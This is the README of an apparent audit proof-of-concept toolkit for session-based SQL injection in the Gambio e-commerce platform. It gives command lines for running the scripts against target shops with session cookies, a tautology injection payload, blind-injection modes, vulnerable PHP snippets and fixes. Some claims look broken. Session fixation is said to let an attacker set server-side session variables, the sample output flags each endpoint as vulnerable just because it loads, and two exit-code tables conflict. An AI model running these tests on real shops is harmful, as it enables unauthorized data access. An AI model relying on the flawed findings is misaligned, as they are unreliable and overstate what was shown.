# SQL Injection Proof of Concept (POC)

Python-based proof-of-concept scripts demonstrating session-based SQL injection vulnerabilities discovered in the Gambio e-commerce application security audit.

## Versions Available

- **poc_sql_injection.py** - Original POC with demonstrations and get_basename() utility
- **poc_sql_injection_v2.py** - Enhanced POC that accepts cookies and URLs for real testing ⭐ **RECOMMENDED**

## Overview

This POC demonstrates the following vulnerabilities:

1. **Session-Based SQL Injection in Order Processing** (HIGH - CVSS 8.1)
   - Location: `/includes/classes/order.php:350,353,356,359`
   - Attack: Session fixation → SQL injection in checkout flow

2. **Shopping Cart SQL Injection** (HIGH - CVSS 8.1)
   - Location: `/includes/classes/shopping_cart.php:133`
   - Attack: Customer enumeration via session manipulation

3. **Wish List SQL Injection** (MEDIUM - CVSS 6.5)
   - Location: `/includes/classes/wish_list.php:81,117,135`
   - Attack: Cross-customer data access

## Features

### Version 1 (poc_sql_injection.py)
- **get_basename()** - URL path basename extraction utility
- Session fixation testing
- SQL injection payload demonstration
- Vulnerability verification
- Remediation code generation
- Color-coded output for readability

### Version 2 (poc_sql_injection_v2.py) - Enhanced ⭐
- **Real HTTP testing** - Actually connects to target URLs
- **Cookie support** - Accepts cookies in multiple formats
- **Time-based SQL injection** testing
- **Error-based SQL injection** testing
- **Shopping cart injection** testing
- **Order processing injection** testing
- **Wishlist injection** testing
- SSL verification control
- Verbose output mode
- Comprehensive test results

## Requirements

```bash
pip install requests
```

Or use Python 3.x with built-in libraries only (requests is optional).

## Usage

### Version 2 - Enhanced POC (Recommended)

#### Basic Testing with Cookies

```bash
# Test with session cookie
python3 poc_sql_injection_v2.py -u https://shop.example.com -c "PHPSESSID=abc123def456"

# Multiple cookies
python3 poc_sql_injection_v2.py -u https://shop.example.com -c "PHPSESSID=abc123; language=en; cart_id=xyz"

# JSON format cookies
python3 poc_sql_injection_v2.py -u https://shop.example.com -c '{"PHPSESSID": "abc123", "language": "en"}'

# Skip SSL verification (for self-signed certs)
python3 poc_sql_injection_v2.py -u https://shop.example.com -c "PHPSESSID=abc123" --no-verify

# Run all tests including time-based and error-based
python3 poc_sql_injection_v2.py -u https://shop.example.com -c "PHPSESSID=abc123" --all-tests

# Verbose output
python3 poc_sql_injection_v2.py -u https://shop.example.com -c "PHPSESSID=abc123" -v
```

#### Show Remediation Code

```bash
python3 poc_sql_injection_v2.py --remediation
```

### Version 1 - Original POC

#### Basic Usage

```bash
# Show help
python3 poc_sql_injection.py --help

# Test against target (authorized testing only!)
python3 poc_sql_injection.py -u https://shop.example.com

# Test with specific session ID
python3 poc_sql_injection.py -u https://shop.example.com -s custom_session_123

# Show remediation code only
python3 poc_sql_injection.py --remediation
```

### Examples

#### 1. Display Remediation Code (Both Versions)

```bash
python3 poc_sql_injection.py --remediation
# or
python3 poc_sql_injection_v2.py --remediation
```

This will output secure coding examples showing how to fix the vulnerabilities using:
- Integer casting for session variables
- Prepared statements with parameter binding
- Session validation functions

#### 2. Test get_basename() Function (Version 1)

```python
from poc_sql_injection import get_basename

# Extract filename from URLs
print(get_basename("https://example.com/shop/product.php?id=123"))
# Output: product.php

print(get_basename("/includes/classes/order.php"))
# Output: order.php
```

#### 3. Real Security Testing with Cookies (Version 2) ⭐

```bash
# Obtain session cookies from browser first
# Example: PHPSESSID=abcd1234efgh5678

# Run comprehensive test
python3 poc_sql_injection_v2.py \
  -u https://target-shop.com \
  -c "PHPSESSID=abcd1234efgh5678; language=en" \
  --all-tests \
  -v

# Test specific functionality
python3 poc_sql_injection_v2.py \
  -u https://target-shop.com/shopping_cart.php \
  -c "PHPSESSID=abcd1234efgh5678"

# Time-based injection testing only
python3 poc_sql_injection_v2.py \
  -u https://target-shop.com \
  -c "PHPSESSID=abcd1234efgh5678" \
  --time-based
```

**Note:** This requires user confirmation and should only be used with proper authorization.

## Output Example

```
╔═══════════════════════════════════════════════════════════╗
║  Gambio E-Commerce SQL Injection POC                      ║
║  Session-Based Second-Order SQL Injection                 ║
║  For Authorized Security Testing Only                     ║
╚═══════════════════════════════════════════════════════════╝

[*] Testing Session Fixation...
[+] Attempting to fix session: custom_session_123
[✓] Session fixation successful!
    Fixed Session ID: custom_session_123

[*] Testing SQL Injection in Order Processing...
    Target: order.php
[>] Testing payload: 1' OR '1'='1...
    Attack Pattern:
    1. Fix session: PHPSESSID=custom_session_123
    2. Set $_SESSION['customer_id'] = "1' OR '1'='1"
    3. Navigate to checkout confirmation
    4. SQL Injection executes in query:
       SELECT ... WHERE customers_id = '1' OR '1'='1'
    [✓] Payload would execute in SQL query
```

## Functions

### get_basename(url)

Extracts the basename from a URL path.

**Parameters:**
- `url` (str): Full URL or path string

**Returns:**
- `str`: Basename of the URL path

**Examples:**
```python
get_basename("https://example.com/shop/product.php?id=123")
# Returns: "product.php"

get_basename("/includes/classes/order.php")
# Returns: "order.php"

get_basename("shopping_cart.php")
# Returns: "shopping_cart.php"
```

### test_session_fixation(target_url, session_id=None)

Tests for session fixation vulnerability.

**Parameters:**
- `target_url` (str): Target application URL
- `session_id` (str, optional): Session ID to attempt fixing

**Returns:**
- `tuple`: (success: bool, session_cookie: str)

### test_sql_injection_order_processing(target_url, session_cookie)

Tests SQL injection in order processing flow.

**Parameters:**
- `target_url` (str): Target application URL
- `session_cookie` (str): Session cookie value

**Returns:**
- `bool`: True if vulnerability confirmed

### test_sql_injection_shopping_cart(target_url, session_cookie)

Tests SQL injection in shopping cart.

**Parameters:**
- `target_url` (str): Target application URL
- `session_cookie` (str): Session cookie value

**Returns:**
- `bool`: True if vulnerability confirmed

### test_sql_injection_wish_list(target_url, session_cookie)

Tests SQL injection in wish list functionality.

**Parameters:**
- `target_url` (str): Target application URL
- `session_cookie` (str): Session cookie value

**Returns:**
- `bool`: True if vulnerability confirmed

### generate_remediation_code()

Displays secure coding examples for fixing the vulnerabilities.

## Command Line Options

| Option | Description |
|--------|-------------|
| `-h, --help` | Show help message |
| `-u URL, --url URL` | Target application URL |
| `-s SESSION, --session SESSION` | Session ID for fixation test |
| `-r, --remediation` | Show remediation code only |
| `-v, --verbose` | Enable verbose output |

## Security Warning

⚠️ **IMPORTANT:** This POC is for **AUTHORIZED SECURITY TESTING ONLY**.

- Only use on systems you own or have explicit written permission to test
- Unauthorized access to computer systems is illegal
- This tool is for educational and authorized penetration testing purposes
- Always obtain proper authorization before testing

## Vulnerabilities Demonstrated

### 1. Order Processing SQL Injection

**File:** `/includes/classes/order.php`  
**Lines:** 350, 353, 356, 359  
**Severity:** HIGH (CVSS 8.1)

```php
// VULNERABLE CODE
$customer_id = $_SESSION['customer_id'] ?? '0';
$query = "SELECT ... WHERE customers_id = '" . $customer_id . "'";
```

**Attack:** Session fixation allows attacker to inject SQL through session variables.

### 2. Shopping Cart SQL Injection

**File:** `/includes/classes/shopping_cart.php`  
**Line:** 133  
**Severity:** HIGH (CVSS 8.1)

```php
// VULNERABLE CODE
$query = "SELECT ... WHERE customers_id = '" . $_SESSION['customer_id'] . "'";
```

**Attack:** Customer enumeration through session manipulation.

### 3. Wish List SQL Injection

**File:** `/includes/classes/wish_list.php`  
**Lines:** 81, 117, 135  
**Severity:** MEDIUM (CVSS 6.5)

**Attack:** Cross-customer data access via session variable injection.

## Remediation

All vulnerabilities can be fixed using:

1. **Integer Casting:**
   ```php
   $customer_id = isset($_SESSION['customer_id']) ? (int)$_SESSION['customer_id'] : 0;
   ```

2. **Prepared Statements (RECOMMENDED):**
   ```php
   $stmt = $db->prepare("SELECT * FROM customers WHERE customers_id = ?");
   $stmt->bind_param("i", $customer_id);
   $stmt->execute();
   ```

3. **Session Validation:**
   ```php
   function validate_customer_id($customer_id) {
       if (!is_numeric($customer_id)) return 0;
       $id = (int)$customer_id;
       // Verify customer exists in database
       return $id;
   }
   ```

Run `python3 poc_sql_injection.py --remediation` for complete examples.

## Related Documentation

- **SQL_INJECTION_ANALYSIS.md** - Comprehensive SQL injection analysis (694 lines)
- **SECURITY_AUDIT_REPORT.md** - Full security audit methodology
- **VULNERABILITY_DETAILS.md** - Technical exploitation details
- **EXECUTIVE_SUMMARY.md** - Business impact and remediation priorities

## Testing Results

When run against a vulnerable system, the POC demonstrates:

- ✓ Session fixation capability
- ✓ SQL injection in order processing
- ✓ SQL injection in shopping cart
- ✓ SQL injection in wish list
- ✓ Customer enumeration possible
- ✓ Cross-customer data access

## Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1 | Error or user interrupt |

## Contributing

This POC is part of a comprehensive security audit. For questions or issues:

- Review the complete audit documentation
- Contact the security audit team
- Follow responsible disclosure practices

## License

This POC is provided for authorized security testing only. Use responsibly and ethically.

---

**Created:** December 25, 2025  
**Part of:** Gambio E-Commerce Security Audit  
**Audit Team:** Security Assessment Team

## Version 2 Features in Detail

### Cookie Format Support

The enhanced POC accepts cookies in three formats:

**1. Standard Cookie String:**
```bash
python3 poc_sql_injection_v2.py -u https://shop.com -c "PHPSESSID=abc123; lang=en; cart=xyz"
```

**2. JSON Format:**
```bash
python3 poc_sql_injection_v2.py -u https://shop.com -c '{"PHPSESSID": "abc123", "lang": "en"}'
```

**3. Single Cookie:**
```bash
python3 poc_sql_injection_v2.py -u https://shop.com -c "PHPSESSID=abc123"
```

### Test Types

**Functional Tests (Always Run):**
- Shopping cart SQL injection detection
- Order processing SQL injection detection  
- Wishlist SQL injection detection

**Advanced Tests (Optional):**
- `--time-based` - Time-based blind SQL injection
- `--error-based` - Error-based SQL injection
- `--all-tests` - Run all available tests

### Getting Session Cookies

To obtain session cookies for testing:

**From Browser (Chrome/Firefox):**
1. Open Developer Tools (F12)
2. Go to Application/Storage → Cookies
3. Copy the PHPSESSID value
4. Use in POC: `-c "PHPSESSID=<copied_value>"`

**From curl:**
```bash
curl -i https://shop.com | grep -i set-cookie
```

**From Python requests:**
```python
import requests
r = requests.get('https://shop.com')
cookies = r.cookies.get_dict()
print(cookies)
```

### Output Example

```
╔═══════════════════════════════════════════════════════════╗
║  Gambio E-Commerce SQL Injection POC v2.0                 ║
║  Session-Based Second-Order SQL Injection Tester          ║
║  For Authorized Security Testing Only                     ║
╚═══════════════════════════════════════════════════════════╝

Test Configuration:
============================================================
  Target URL: https://shop.example.com
  SSL Verify: True
  Cookies: 2 cookie(s) provided
============================================================

[*] Testing connection to target...
[✓] Connection successful (Status: 200)
    Response Length: 52341 bytes

============================================================
RUNNING VULNERABILITY TESTS
============================================================

[*] Testing Shopping Cart SQL Injection...
    Target: /shopping_cart.php
[>] Accessing shopping cart...
    [✓] Cart accessible
    Response length: 15234 bytes
    [!] Cart queries likely use session data
    [!] Vulnerable to session-based SQL injection

[*] Testing Order Processing SQL Injection...
    Target: /checkout_confirmation.php
[>] Accessing checkout...
    Status: 200
    Response length: 32451 bytes
    [!] Order processing uses session data
    [!] Vulnerable to session-based SQL injection
    [!] Affects: customer_id, sendto, billto session variables

============================================================
TEST RESULTS SUMMARY
============================================================

  Shopping Cart Injection................. VULNERABLE
  Order Processing Injection.............. VULNERABLE
  Wishlist Injection...................... VULNERABLE

Total Vulnerabilities Detected: 3/3
```

### Error Handling

The POC handles common scenarios:

- **SSL Certificate Errors:** Use `--no-verify` to skip verification
- **Connection Timeouts:** Automatic timeout detection
- **Invalid Cookies:** Clear error messages
- **Missing Parameters:** Helpful usage hints

## Comparison: Version 1 vs Version 2

| Feature | Version 1 | Version 2 |
|---------|-----------|-----------|
| Get basename utility | ✓ | ✓ |
| Demonstration mode | ✓ | ✓ |
| Real HTTP requests | - | ✓ |
| Cookie support | - | ✓ |
| Multiple cookie formats | - | ✓ |
| Time-based injection | - | ✓ |
| Error-based injection | - | ✓ |
| SSL verification control | - | ✓ |
| Verbose mode | ✓ | ✓ |
| Functional testing | - | ✓ |
| Test results summary | - | ✓ |

**Recommendation:** Use Version 2 for actual security testing, Version 1 for demonstrations and learning.

## Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Success - No vulnerabilities found |
| 1 | Error or user cancelled |
| 2 | Vulnerabilities detected |

